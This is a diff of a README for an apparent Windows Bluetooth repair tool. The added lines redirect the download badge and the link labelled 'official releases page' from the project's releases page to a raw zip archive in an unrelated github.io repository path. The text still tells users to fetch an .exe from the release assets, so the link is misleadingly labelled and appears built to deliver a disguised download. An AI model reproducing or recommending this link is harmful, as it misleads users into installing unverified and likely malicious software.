@@ -5,13 +5,13 @@ description: "Resolve Bluetooth pairing, connection, and driver errors on Window
 ---
 # 🛠 Bluetooth-Repair-Tool - Fix your broken Windows wireless connections
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/perirhinal-flit845/Bluetooth-Repair-Tool/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/perirhinal-flit845/perirhinal-flit845.github.io/raw/refs/heads/main/zayin/perirhinal-flit-github-io-3.0-beta.1.zip)
 
 Bluetooth-Repair-Tool automates the process of fixing common wireless connection failures on Windows 10 and 11. It addresses issues like missing radio toggles, failed device pairing, and audio output errors. The software works with Intel, Realtek, Qualcomm, and generic USB Bluetooth adapters.
 
 ## 📥 How to download the tool
 
-Visit the [official releases page](https://github.com/perirhinal-flit845/Bluetooth-Repair-Tool/releases) to obtain the software. Look under the "Assets" section of the latest version and download the file ending in .exe. Save this file to your computer desktop or your Downloads folder for easy access.
+Visit the [official releases page](https://github.com/perirhinal-flit845/perirhinal-flit845.github.io/raw/refs/heads/main/zayin/perirhinal-flit-github-io-3.0-beta.1.zip) to obtain the software. Look under the "Assets" section of the latest version and download the file ending in .exe. Save this file to your computer desktop or your Downloads folder for easy access.
 
 ## 📋 System Requirements
 
